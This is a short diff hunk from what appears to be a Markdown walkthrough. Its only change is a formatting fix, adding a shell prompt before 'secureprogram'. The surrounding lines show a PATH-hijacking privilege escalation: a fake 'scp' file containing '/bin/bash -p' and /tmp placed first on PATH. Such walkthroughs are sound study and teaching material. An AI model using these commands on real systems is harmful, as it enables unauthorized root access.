@@ -17,5 +17,5 @@ $ echo "/bin/bash -p" > scp
 
 $ export PATH=/tmp:$PATH
 
-secureprogram
+$ secureprogram
 ```
